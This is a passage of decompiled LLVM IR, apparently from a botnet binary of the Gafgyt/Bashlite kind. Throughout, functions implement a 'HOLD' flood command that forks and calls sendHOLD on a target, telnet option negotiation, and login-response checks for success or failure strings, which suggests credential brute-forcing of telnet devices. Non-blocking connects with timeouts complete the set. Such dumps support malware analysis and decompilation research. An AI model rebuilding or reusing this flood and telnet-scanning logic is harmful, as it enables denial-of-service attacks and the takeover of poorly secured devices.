  %v0_1000c840 = phi i32 [ %v4_1000c2b8, %entry ], [ %v1_1000c80413, %dec_label_pc_1000c2cc ], [ %v1_1000c804, %dec_label_pc_1000c800.loopexit ]
  ret i32 %v0_1000c840

; uselistorder directives
  uselistorder i32 %v1_1000c7e8, { 1, 0 }
  uselistorder i32 %v1_1000c6d8, { 1, 0 }
  uselistorder i32 %storemerge57, { 1, 0 }
  uselistorder i8* %v2_1000c380, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000c37c, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge311, { 2, 0, 1 }
  uselistorder i32 %v2_1000c4bc, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_1000c358, { 1, 0 }
  uselistorder i32 %v2_1000c2a8, { 1, 0 }
  uselistorder i32 %v1_1000c294, { 1, 0 }
  uselistorder i32 %v3_1000c27c, { 1, 0, 2 }
  uselistorder i32 %v1_1000c27c, { 1, 0 }
  uselistorder i32 %v0_1000c274, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 1, 0 }
  uselistorder i32 268486664, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7f0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c800.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7e4, { 8, 2, 5, 1, 6, 7, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000c4d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c480, { 1, 0 }
}

define i32 @hold(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = icmp slt i32 %arg3, 3
  br i1 %tmp11, label %dec_label_pc_1000c89c, label %dec_label_pc_1000c87c

dec_label_pc_1000c87c:                            ; preds = %entry
  %v1_1000c880 = add i32 %arg4, 12
  %v1_1000c884 = inttoptr i32 %v1_1000c880 to i32*
  %v2_1000c884 = load i32, i32* %v1_1000c884, align 4
  store i32 268486800, i32* @lr, align 4
  %v1_1000c88c = call i32 @atol(i32 %v2_1000c884)
  %tmp12 = icmp sgt i32 %v1_1000c88c, -1
  br i1 %tmp12, label %dec_label_pc_1000c8b8, label %dec_label_pc_1000c89c

dec_label_pc_1000c89c:                            ; preds = %dec_label_pc_1000c87c, %entry
  %v6_1000c8b0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1002bbe0.491 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000c954

dec_label_pc_1000c8b8:                            ; preds = %dec_label_pc_1000c87c
  %v1_1000c8bc = call i32 @mfork(i32 %arg2)
  %v3_1000c8c4 = icmp eq i32 %v1_1000c8bc, 0
  br i1 %v3_1000c8c4, label %dec_label_pc_1000c8cc, label %dec_label_pc_1000c954

dec_label_pc_1000c8cc:                            ; preds = %dec_label_pc_1000c8b8
  %v1_1000c8d0 = add i32 %arg4, 4
  %v1_1000c8d4 = inttoptr i32 %v1_1000c8d0 to i32*
  %v2_1000c8d4 = load i32, i32* %v1_1000c8d4, align 4
  %v1_1000c8dc = add i32 %arg4, 8
  %v1_1000c8e0 = inttoptr i32 %v1_1000c8dc to i32*
  %v7_1000c900 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002bc04.493 to i32), i32 %arg2, i32 %v2_1000c8d4)
  %v2_1000c91c = load i32, i32* %v1_1000c8e0, align 4
  store i32 268486952, i32* @lr, align 4
  %v1_1000c924 = call i32 @atol(i32 %v2_1000c91c)
  store i32 %v1_1000c924, i32* @r29, align 4
  %v2_1000c934 = load i32, i32* %v1_1000c884, align 4
  store i32 268486976, i32* @lr, align 4
  %v1_1000c93c = call i32 @atol(i32 %v2_1000c934)
  %v0_1000c944 = load i32, i32* @r28, align 4
  %v0_1000c948 = load i32, i32* @r29, align 4
  %v3_1000c950 = call i32 @sendHOLD(i32 %v0_1000c944, i32 %v0_1000c948, i32 %v1_1000c93c)
  br label %dec_label_pc_1000c954

dec_label_pc_1000c954:                            ; preds = %dec_label_pc_1000c8b8, %dec_label_pc_1000c89c, %dec_label_pc_1000c8cc
  %v0_1000c970 = phi i32 [ %v1_1000c8bc, %dec_label_pc_1000c8b8 ], [ %v6_1000c8b0, %dec_label_pc_1000c89c ], [ %v3_1000c950, %dec_label_pc_1000c8cc ]
  ret i32 %v0_1000c970

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c954, { 2, 0, 1 }
}

define i32 @get_ipstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_1000c990 = add i32 %arg1, 4
  %v2_1000c990 = inttoptr i32 %v1_1000c990 to i32*
  %v3_1000c990 = load i32, i32* %v2_1000c990, align 4
  store i32 %v3_1000c990, i32* %stack_var_-20, align 4
  store i32 268487084, i32* @lr, align 4
  %v3_1000c9a8 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_1000c9a8
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 268487176, i32* @lr, align 4
  %v0_1000ca04 = call i32 @__GI_memset()
  %v5_1000ca1c = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_1000ca2c = load i8, i8* %arg3, align 1
  %v3_1000ca34 = icmp eq i8 %v3_1000ca2c, -1
  br i1 %v3_1000ca34, label %dec_label_pc_1000ca3c, label %dec_label_pc_1000ca50

dec_label_pc_1000ca3c:                            ; preds = %entry
  store i32 268487248, i32* @lr, align 4
  %v6_1000ca4c = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_1000ca50

dec_label_pc_1000ca50:                            ; preds = %entry, %dec_label_pc_1000ca3c
  %v3_1000ca5c = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_1000ca64 = icmp ne i32 %v3_1000ca5c, 0
  %. = zext i1 %v3_1000ca64 to i32
  ret i32 %.

; uselistorder directives
  uselistorder label %dec_label_pc_1000ca50, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_1000cad4 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000cad4, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge

dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge: ; preds = %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge.dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge_crit_edge, %entry
  %v3_1000caec.pre = phi i32 [ %v2_1000cad4, %entry ], [ %v3_1000caec.pre.pre, %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge.dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge_crit_edge ]
  %v1_1000cb0421 = phi i32 [ 1, %entry ], [ %v1_1000cb04, %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge.dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge_crit_edge ]
  %v1_1000caf0 = mul nuw nsw i32 %v1_1000cb0421, 4
  %v2_1000caf4 = add i32 %v1_1000caf0, %v3_1000caec.pre
  %v2_1000cafc = inttoptr i32 %v2_1000caf4 to i32*
  store i32 0, i32* %v2_1000cafc, align 4
  %v1_1000cb04 = add nuw nsw i32 %v1_1000cb0421, 1
  %tmp19 = icmp ult i32 %v1_1000cb04, 32
  br i1 %tmp19, label %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge.dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge_crit_edge, label %dec_label_pc_1000cb18

dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge.dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge_crit_edge: ; preds = %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge
  %v3_1000caec.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge

dec_label_pc_1000cb18:                            ; preds = %dec_label_pc_1000cae8.dec_label_pc_1000cae8_crit_edge
  %v1_1000cb1c = udiv i32 %arg1, 32
  %v1_1000cb24 = mul nuw nsw i32 %v1_1000cb1c, 4
  %v2_1000cb28 = ptrtoint i32* %stack_var_-184 to i32
  %v2_1000cb2c = add nuw nsw i32 %v1_1000cb24, 8
  %v1_1000cb30 = add i32 %v2_1000cb2c, %v2_1000cb28
  %v1_1000cb34 = inttoptr i32 %v1_1000cb30 to i32*
  %v2_1000cb34 = load i32, i32* %v1_1000cb34, align 4
  %v1_1000cb3c = urem i32 %arg1, 32
  %v3_1000cb44 = shl i32 1, %v1_1000cb3c
  %v2_1000cb48 = or i32 %v2_1000cb34, %v3_1000cb44
  store i32 %v2_1000cb48, i32* %v1_1000cb34, align 4
  %v1_1000cb64 = add i32 %arg1, 1
  %v2_1000cb6c = ptrtoint i32* %stack_var_-48 to i32
  store i32 268487560, i32* @lr, align 4
  %v5_1000cb84 = call i32 @__libc_select(i32 %v1_1000cb64, i32 %v2_1000cad4, i32 0, i32 0, i32 %v2_1000cb6c)
  %v2_1000cb8c = icmp sgt i32 %v5_1000cb84, 0
  br i1 %v2_1000cb8c, label %dec_label_pc_1000cba0, label %dec_label_pc_1000cbc0

dec_label_pc_1000cba0:                            ; preds = %dec_label_pc_1000cb18
  store i32 268487608, i32* @lr, align 4
  %v4_1000cbb4 = call i32 @recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_1000cbc0

dec_label_pc_1000cbc0:                            ; preds = %dec_label_pc_1000cb18, %dec_label_pc_1000cba0
  %storemerge = phi i32 [ %v4_1000cbb4, %dec_label_pc_1000cba0 ], [ 0, %dec_label_pc_1000cb18 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_1000cb04, { 1, 0 }
  uselistorder i32 %v2_1000cad4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_1000cbc0, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000cc00 = icmp eq i32 %arg2, 0
  br i1 %v3_1000cc00, label %dec_label_pc_1000cc08, label %dec_label_pc_1000cc18

dec_label_pc_1000cc08:                            ; preds = %entry
  %v2_1000cc0c = load i32, i32* %arg1, align 4
  store i32 268487704, i32* @lr, align 4
  %v1_1000cc14 = call i32 @close(i32 %v2_1000cc0c)
  br label %dec_label_pc_1000cc18

dec_label_pc_1000cc18:                            ; preds = %entry, %dec_label_pc_1000cc08
  %v2_1000cc20 = add i32 %tmp, 16
  %v3_1000cc20 = inttoptr i32 %v2_1000cc20 to i32*
  store i32 0, i32* %v3_1000cc20, align 4
  %v1_1000cc30 = trunc i32 %arg2 to i8
  %v3_1000cc30 = add i32 %tmp, 8
  %v4_1000cc30 = inttoptr i32 %v3_1000cc30 to i8*
  store i8 %v1_1000cc30, i8* %v4_1000cc30, align 1
  %v1_1000cc38 = add i32 %tmp, 28
  %v2_1000cc38 = inttoptr i32 %v1_1000cc38 to i32*
  %v3_1000cc38 = load i32, i32* %v2_1000cc38, align 4
  store i32 %v3_1000cc38, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268487756, i32* @lr, align 4
  %v0_1000cc48 = call i32 @__GI_memset()
  ret i32 %v0_1000cc48

; uselistorder directives
  uselistorder label %dec_label_pc_1000cc18, { 1, 0 }
}

define i32 @reset_ipstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000cc84 = inttoptr i32 %arg1 to i32*
  %v3_1000cc84 = call i32 @advance_state(i32* %v2_1000cc84, i32 0)
  %v3_1000cc90 = add i32 %arg1, 9
  %v4_1000cc90 = inttoptr i32 %v3_1000cc90 to i8*
  store i8 1, i8* %v4_1000cc90, align 1
  ret i32 %v3_1000cc84

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000ccd4 = call i32 @contains_string(i32 %arg1, i32 268699352)
  ret i32 %v2_1000ccd4
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000cd20 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([8 x i8*]* @global_var_10040694.507 to i32))
  ret i32 %v3_1000cd20

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268488036, i32* @lr, align 4
  %v1_1000cd60 = call i32 @contains_success(i32 %arg1)
  %v3_1000cd68 = icmp eq i32 %v1_1000cd60, 0
  br i1 %v3_1000cd68, label %dec_label_pc_1000cd70, label %dec_label_pc_1000cd98

dec_label_pc_1000cd70:                            ; preds = %entry
  store i32 268488056, i32* @lr, align 4
  %v1_1000cd74 = call i32 @contains_fail(i32 %arg1)
  %v3_1000cd7c = icmp ne i32 %v1_1000cd74, 0
  %. = zext i1 %v3_1000cd7c to i32
  br label %dec_label_pc_1000cd98

dec_label_pc_1000cd98:                            ; preds = %dec_label_pc_1000cd70, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_1000cd70 ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000cdec

dec_label_pc_1000cdec:                            ; preds = %dec_label_pc_1000cdec, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_1000cdf0, %dec_label_pc_1000cdec ]
  %v1_1000cdf0 = add i32 %stack_var_-36.0, 1
  %v1_1000cdfc = mul i32 %v1_1000cdf0, 4
  %v2_1000ce08 = add i32 %v1_1000cdfc, %arg2
  %v1_1000ce0c = inttoptr i32 %v2_1000ce08 to i32*
  %v2_1000ce0c = load i32, i32* %v1_1000ce0c, align 4
  %v3_1000ce10 = icmp eq i32 %v2_1000ce0c, 0
  br i1 %v3_1000ce10, label %dec_label_pc_1000ce70.preheader, label %dec_label_pc_1000cdec

dec_label_pc_1000ce70.preheader:                  ; preds = %dec_label_pc_1000cdec
  %v2_1000ce784 = icmp sgt i32 %v1_1000cdf0, 0
  br i1 %v2_1000ce784, label %dec_label_pc_1000ce24.lr.ph, label %dec_label_pc_1000ce88

dec_label_pc_1000ce24.lr.ph:                      ; preds = %dec_label_pc_1000ce70.preheader
  %v3_1000ce48 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_1000ce24

dec_label_pc_1000ce24:                            ; preds = %dec_label_pc_1000ce24.lr.ph, %dec_label_pc_1000ce64
  %storemerge27 = phi i32 [ 0, %dec_label_pc_1000ce24.lr.ph ], [ %v1_1000ce68, %dec_label_pc_1000ce64 ]
  %v1_1000ce28 = mul i32 %storemerge27, 4
  %v2_1000ce34 = add i32 %v1_1000ce28, %arg2
  %v1_1000ce38 = inttoptr i32 %v2_1000ce34 to i32*
  %v2_1000ce38 = load i32, i32* %v1_1000ce38, align 4
  store i32 268488268, i32* @lr, align 4
  %v4_1000ce48 = call i32 @strcasestr(i8* %v3_1000ce48, i32 %v2_1000ce38, i32 %v2_1000ce34)
  %v3_1000ce50 = icmp eq i32 %v4_1000ce48, 0
  br i1 %v3_1000ce50, label %dec_label_pc_1000ce64, label %dec_label_pc_1000ce88.loopexit

dec_label_pc_1000ce64:                            ; preds = %dec_label_pc_1000ce24
  %v1_1000ce68 = add nuw nsw i32 %storemerge27, 1
  %v2_1000ce78 = icmp slt i32 %v1_1000ce68, %v1_1000cdf0
  br i1 %v2_1000ce78, label %dec_label_pc_1000ce24, label %dec_label_pc_1000ce88.loopexit

dec_label_pc_1000ce88.loopexit:                   ; preds = %dec_label_pc_1000ce64, %dec_label_pc_1000ce24
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_1000ce24 ], [ 0, %dec_label_pc_1000ce64 ]
  br label %dec_label_pc_1000ce88

dec_label_pc_1000ce88:                            ; preds = %dec_label_pc_1000ce88.loopexit, %dec_label_pc_1000ce70.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_1000ce70.preheader ], [ %storemerge.ph, %dec_label_pc_1000ce88.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_1000cdf0, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000ce24, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268488416, i32* @lr, align 4
  %v3_1000cedc = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v1_1000ceec = or i32 %v3_1000cedc, 2048
  store i32 ptrtoint (i32* @global_var_1000cf08.508 to i32), i32* @lr, align 4
  %v3_1000cf04 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v1_1000ceec)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_1000cf14 = urem i32 %arg3, 65536
  store i32 %v1_1000cf14, i32* @r3, align 4
  %v1_1000cf1c = call i32 @htons(i32 %v1_1000cf14)
  %v2_1000cf2c = ptrtoint i32* %stack_var_-200 to i32
  %v4_1000cf3c = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_1000cf2c)
  %v3_1000cf44 = icmp eq i32 %v4_1000cf3c, 0
  br i1 %v3_1000cf44, label %dec_label_pc_1000cf58, label %dec_label_pc_1000cf4c

dec_label_pc_1000cf4c:                            ; preds = %entry
  br label %dec_label_pc_1000d118

dec_label_pc_1000cf58:                            ; preds = %entry
  %v2_1000cf5c = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_1000cf5c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268488560, i32* @lr, align 4
  %v0_1000cf6c = call i32 @__GI_memset()
  store i32 268488580, i32* @lr, align 4
  %v3_1000cf80 = call i32 @connect(i32 %arg1, i32 %v2_1000cf2c, i32 16)
  %tmp25 = icmp sgt i32 %v3_1000cf80, -1
  br i1 %tmp25, label %dec_label_pc_1000d0d4, label %dec_label_pc_1000cf98

dec_label_pc_1000cf98:                            ; preds = %dec_label_pc_1000cf58
  %v0_1000cf98 = call i32 @__errno_location()
  %v1_1000cfa0 = inttoptr i32 %v0_1000cf98 to i32*
  %v2_1000cfa0 = load i32, i32* %v1_1000cfa0, align 4
  %v3_1000cfa4 = icmp eq i32 %v2_1000cfa0, 115
  br i1 %v3_1000cfa4, label %dec_label_pc_1000cfac, label %dec_label_pc_1000d0c8

dec_label_pc_1000cfac:                            ; preds = %dec_label_pc_1000cf98
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_1000cfbc = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_1000cfbc, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge

dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge: ; preds = %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge.dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge_crit_edge, %dec_label_pc_1000cfac
  %v3_1000cfd4.pre = phi i32 [ %v2_1000cfbc, %dec_label_pc_1000cfac ], [ %v3_1000cfd4.pre.pre, %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge.dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge_crit_edge ]
  %v1_1000cfec29 = phi i32 [ 1, %dec_label_pc_1000cfac ], [ %v1_1000cfec, %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge.dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge_crit_edge ]
  %v1_1000cfd8 = mul nuw nsw i32 %v1_1000cfec29, 4
  %v2_1000cfdc = add i32 %v1_1000cfd8, %v3_1000cfd4.pre
  %v2_1000cfe4 = inttoptr i32 %v2_1000cfdc to i32*
  store i32 0, i32* %v2_1000cfe4, align 4
  %v1_1000cfec = add nuw nsw i32 %v1_1000cfec29, 1
  %tmp26 = icmp ult i32 %v1_1000cfec, 32
  br i1 %tmp26, label %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge.dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge_crit_edge, label %dec_label_pc_1000d000

dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge.dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge_crit_edge: ; preds = %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge
  %v3_1000cfd4.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge

dec_label_pc_1000d000:                            ; preds = %dec_label_pc_1000cfd0.dec_label_pc_1000cfd0_crit_edge
  %v1_1000d004 = udiv i32 %arg1, 32
  %v1_1000d00c = mul nuw nsw i32 %v1_1000d004, 4
  %v2_1000d010 = ptrtoint i32* %stack_var_-216 to i32
  %v2_1000d014 = add nuw nsw i32 %v1_1000d00c, 32
  %v1_1000d018 = add i32 %v2_1000d014, %v2_1000d010
  %v1_1000d01c = inttoptr i32 %v1_1000d018 to i32*
  %v2_1000d01c = load i32, i32* %v1_1000d01c, align 4
  %v1_1000d024 = urem i32 %arg1, 32
  %v3_1000d02c = shl i32 1, %v1_1000d024
  %v2_1000d030 = or i32 %v2_1000d01c, %v3_1000d02c
  store i32 %v2_1000d030, i32* %v1_1000d01c, align 4
  %v1_1000d04c = add i32 %arg1, 1
  %v2_1000d054 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268488816, i32* @lr, align 4
  %v5_1000d06c = call i32 @__libc_select(i32 %v1_1000d04c, i32 0, i32 %v2_1000cfbc, i32 0, i32 %v2_1000d054)
  %tmp27 = icmp slt i32 %v5_1000d06c, 1
  br i1 %tmp27, label %dec_label_pc_1000d0bc, label %dec_label_pc_1000d07c

dec_label_pc_1000d07c:                            ; preds = %dec_label_pc_1000d000
  store i32 4, i32* %stack_var_-48, align 4
  %v2_1000d084 = ptrtoint i32* %stack_var_-44 to i32
  %v2_1000d088 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268488868, i32* @lr, align 4
  %v5_1000d0a0 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_1000d084, i32 %v2_1000d088)
  %v3_1000d0a4 = load i32, i32* %stack_var_-44, align 4
  %v3_1000d0a8 = icmp eq i32 %v3_1000d0a4, 0
  br i1 %v3_1000d0a8, label %dec_label_pc_1000d0d4, label %dec_label_pc_1000d0b0

dec_label_pc_1000d0b0:                            ; preds = %dec_label_pc_1000d07c
  br label %dec_label_pc_1000d118

dec_label_pc_1000d0bc:                            ; preds = %dec_label_pc_1000d000
  br label %dec_label_pc_1000d118

dec_label_pc_1000d0c8:                            ; preds = %dec_label_pc_1000cf98
  br label %dec_label_pc_1000d118

dec_label_pc_1000d0d4:                            ; preds = %dec_label_pc_1000d07c, %dec_label_pc_1000cf58
  store i32 268488936, i32* @lr, align 4
  %v3_1000d0e4 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v1_1000d0f4 = call i32 @__asm_rlwinm(i32 %v3_1000d0e4, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_1000d110.509 to i32), i32* @lr, align 4
  %v3_1000d10c = call i32 @fcntl(i32 %arg1, i32 4, i32 %v1_1000d0f4)
  br label %dec_label_pc_1000d118

dec_label_pc_1000d118:                            ; preds = %dec_label_pc_1000d0c8, %dec_label_pc_1000d0bc, %dec_label_pc_1000d0b0, %dec_label_pc_1000cf4c, %dec_label_pc_1000d0d4
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_1000d0d4 ], [ 0, %dec_label_pc_1000d0bc ], [ 0, %dec_label_pc_1000d0b0 ], [ 0, %dec_label_pc_1000d0c8 ], [ 0, %dec_label_pc_1000cf4c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_1000cfec, { 1, 0 }
  uselistorder i32 %v2_1000cfbc, { 1, 0, 2 }
  uselistorder i32 %v2_1000cf2c, { 1, 0 }
  uselistorder i32 %v1_1000cf14, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @getHost, { 3, 0, 1, 2 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000d118, { 4, 0, 1, 2, 3 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_1000d15c = add i32 %arg2, 1
  %v1_1000d160 = inttoptr i32 %v1_1000d15c to i8*
  %v2_1000d160 = load i8, i8* %v1_1000d160, align 1
  %v1_1000d170 = icmp ult i8 %v2_1000d160, -5
  br i1 %v1_1000d170, label %dec_label_pc_1000d2c8, label %dec_label_pc_1000d178

dec_label_pc_1000d178:                            ; preds = %entry
  %v2_1000d17c = icmp eq i8 %v2_1000d160, -1
  br i1 %v2_1000d17c, label %dec_label_pc_1000d184, label %dec_label_pc_1000d1a0

dec_label_pc_1000d184:                            ; preds = %dec_label_pc_1000d178
  br label %dec_label_pc_1000d2c8

dec_label_pc_1000d1a0:                            ; preds = %dec_label_pc_1000d178
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_1000d1ac = ptrtoint i8* %stack_var_-56 to i32
  store i32 268489152, i32* @lr, align 4
  %v4_1000d1bc = call i32 @send(i32 %arg1, i32 %v2_1000d1ac, i32 1, i32 16384)
  %v2_1000d1c8 = load i8, i8* %v1_1000d160, align 1
  %v3_1000d1d0 = icmp eq i8 %v2_1000d1c8, -4
  br i1 %v3_1000d1d0, label %dec_label_pc_1000d1d8, label %dec_label_pc_1000d1e4

dec_label_pc_1000d1d8:                            ; preds = %dec_label_pc_1000d1a0
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d28c

dec_label_pc_1000d1e4:                            ; preds = %dec_label_pc_1000d1a0
  %v2_1000d1ec = load i8, i8* %v1_1000d160, align 1
  %v3_1000d1f4 = icmp eq i8 %v2_1000d1ec, -2
  br i1 %v3_1000d1f4, label %dec_label_pc_1000d1fc, label %dec_label_pc_1000d208

dec_label_pc_1000d1fc:                            ; preds = %dec_label_pc_1000d1e4
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d28c

dec_label_pc_1000d208:                            ; preds = %dec_label_pc_1000d1e4
  %v2_1000d210 = load i8, i8* %v1_1000d160, align 1
  %v3_1000d218 = icmp eq i8 %v2_1000d210, 3
  br i1 %v3_1000d218, label %dec_label_pc_1000d220, label %dec_label_pc_1000d258

dec_label_pc_1000d220:                            ; preds = %dec_label_pc_1000d208
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d28c

dec_label_pc_1000d258:                            ; preds = %dec_label_pc_1000d208
  %v3_1000d230 = icmp eq i8 %v2_1000d210, -3
  %.7 = select i1 %v3_1000d230, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000d28c

dec_label_pc_1000d28c:                            ; preds = %dec_label_pc_1000d220, %dec_label_pc_1000d1fc, %dec_label_pc_1000d1d8, %dec_label_pc_1000d258
  store i32 268489380, i32* @lr, align 4
  %v4_1000d2a0 = call i32 @send(i32 %arg1, i32 %v2_1000d1ac, i32 1, i32 16384)
  %v1_1000d2a8 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_1000d2c0.510 to i32), i32* @lr, align 4
  %v4_1000d2bc = call i32 @send(i32 %arg1, i32 %v1_1000d2a8, i32 1, i32 16384)
  br label %dec_label_pc_1000d2c8

dec_label_pc_1000d2c8:                            ; preds = %dec_label_pc_1000d184, %dec_label_pc_1000d28c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @send, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1000d2c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d28c, { 3, 0, 1, 2 }
}

